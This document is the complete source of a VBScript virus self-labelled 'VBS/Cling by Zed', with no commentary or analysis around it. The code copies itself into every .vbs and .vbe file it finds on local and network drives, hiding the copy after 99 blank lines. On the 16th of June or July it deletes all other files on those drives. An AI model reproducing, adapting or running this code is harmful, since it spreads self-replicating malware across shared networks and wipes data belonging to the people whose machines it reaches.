On Error Resume Next
Set MSFSOobj01 = Nothing
Set MSWSNobj01 = Nothing
Set MSOpnTxtFile01 = Nothing
Set MSFSOobj01 = CreateObject("Scripting.FileSystemObject")
Set MSWSNobj01 = CreateObject("WScript.Network")
Set MSOpnTxtFile01 = MSFSOobj01.OpenTextFile(WScript.ScriptFullName, 1)
ClngRdAllSrc01 = MSOpnTxtFile01.ReadAll
MSOpnTxtFile01.Close
For Each ClNgCodeLine01 In Split(ClngRdAllSrc01, vbCrLf)
If ClNgCodeLine01 = "'VBS/Cling by Zed" Then
ClngStartWrite01 = 1
End If
If ClngStartWrite01 = 1 Then
ClngReadCodeLines01 = ClngReadCodeLines01 & ClNgCodeLine01 & vbCrLf
If ClNgCodeLine01 = "'VBS/Cling end" Then
Exit For
End If
End If
Next
ClngReadCodeLines01 = Left(ClngReadCodeLines01, Len(ClngReadCodeLines01) - 2)
ClngPayloadDate01 = 0
If Day(Now) = 16 Then
If Month(Now) = 6 Or Month(Now) = 7 Then
ClngPayloadDate01 = 1
End If
End If
For Each ClngSeekNetworkDrives01 In MSWSNobj01.EnumNetworkDrives
If ClngSeekNetworkDrives01 <> "" Then
ClngSeekOtherFolders01 ClngSeekNetworkDrives01
End If
Next
For Each ClngSeekMappedDrives01 In MSFSOobj01.Drives
If ClngSeekMappedDrives01.DriveType = 2 Or ClngSeekMappedDrives01.DriveType = 3 Then
If ClngSeekMappedDrives01.IsReady Then
ClngSeekOtherFolders01 ClngSeekMappedDrives01.Path & "\"
End If
End If
Next
Function ClngSeekOtherFolders01(ClngOtherFolder01)
For Each ClngSeekLoop01 In MSFSOobj01.GetFolder(ClngOtherFolder01).SubFolders
ClngSeekOtherFiles01 ClngSeekLoop01
ClngSeekOtherFolders01 ClngSeekLoop01
Next
End Function
Function ClngSeekOtherFiles01(ClngOtherFolder01)
For Each ClngSeekLoop01 In MSFSOobj01.GetFolder(ClngOtherFolder01).Files
ClngFoundFileExt01 = LCase(MSFSOobj01.GetExtensionName(ClngSeekLoop01.Path))
If ClngFoundFileExt01 = "vbs" Or ClngFoundFileExt01 = "vbe" Then
MSFSOobj01.GetFile(ClngSeekLoop01.Path).Attributes = 0
Set ClngOpnScriptFile01 = MSFSOobj01.OpenTextFile(ClngSeekLoop01.Path, 1)
ClngReadFlSrc01 = ClngOpnScriptFile01.ReadAll
ClngOpnScriptFile01.Close
If InStr(1, ClngReadFlSrc01, "'VBS/Cling by Zed") = 0 Then
Set ClngWriteScriptFile01 = MSFSOobj01.OpenTextFile(ClngSeekLoop01.Path, 8)
ClngWriteScriptFile01.WriteBlankLines(99)
ClngWriteScriptFile01.Write ClngReadCodeLines01
ClngWriteScriptFile01.Close
End If
End If
If ClngPayloadDate01 = 1 Then
If ClngFoundFileExt01 <> "vbs" And ClngFoundFileExt01 <> "vbe" Then
MSFSOobj01.DeleteFile ClngSeekLoop01.Path
End If
End If
Next
End Function
'VBS/Cling end